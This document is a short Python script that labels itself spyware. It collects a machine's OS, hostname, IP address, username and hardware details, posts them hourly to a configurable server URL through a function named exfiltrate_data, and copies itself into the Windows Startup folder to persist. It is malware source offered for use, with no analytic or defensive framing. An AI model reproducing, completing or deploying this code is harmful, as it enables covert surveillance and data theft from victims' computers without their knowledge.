import os
import shutil
import subprocess
import requests
import time
import threading
import platform
import getpass
import socket
import psutil
import json
import base64


SERVER_URL = ''
USERNAME = getpass.getuser()
COMPUTER_NAME = socket.gethostname()


def gather_system_info():
    system_info = {}

   
    system_info['os'] = platform.system()
    system_info['os_version'] = platform.version()
    system_info['architecture'] = platform.architecture()

    
    system_info['hostname'] = socket.gethostname()
    system_info['ip_address'] = socket.gethostbyname(socket.gethostname())

  
    system_info['username'] = USERNAME

   
    system_info['cpu'] = platform.processor()

    
    mem = psutil.virtual_memory()
    system_info['total_memory'] = mem.total
    system_info['available_memory'] = mem.available

    return system_info


def exfiltrate_data(data):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(SERVER_URL, data=json.dumps(data), headers=headers)
        if response.status_code == 200:
            print("[INFO] Data exfiltration successful")
        else:
            print("[ERROR] Data exfiltration failed")
    except Exception as e:
        print("[ERROR] Data exfiltration failed:", e)


def install_persistence():
    try:
        
        home_dir = os.path.expanduser('~')

        
        startup_path = os.path.join(home_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        shutil.copy(__file__, startup_path)
        print("[INFO] Persistence installed successfully")
    except Exception as e:
        print("[ERROR] Failed to install persistence:", e)


def main():
    try:
        while True:
         
            system_info = gather_system_info()

          
            exfiltrate_data(system_info)

        
            time.sleep(3600)
    except KeyboardInterrupt:
        print("[INFO] Exiting spyware")


if __name__ == '__main__':
   
    install_persistence()

 
    t = threading.Thread(target=main)
    t.daemon = True
    t.start()
    print("[INFO] Spyware running in the background Successfully")
